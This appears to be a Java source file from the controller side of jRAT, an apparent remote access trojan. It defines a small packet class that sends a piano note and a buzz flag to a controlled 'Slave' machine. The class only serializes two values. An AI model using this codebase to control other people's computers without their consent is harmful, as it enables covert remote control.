package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet66PianoNote extends AbstractOutgoingPacket {

	private int note;
	private boolean buzz;

	public Packet66PianoNote(int note, boolean buzz) {
		this.note = note;
		this.buzz = buzz;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(note);
		dos.writeBoolean(buzz);
	}

	@Override
	public byte getPacketId() {
		return 66;
	}

}
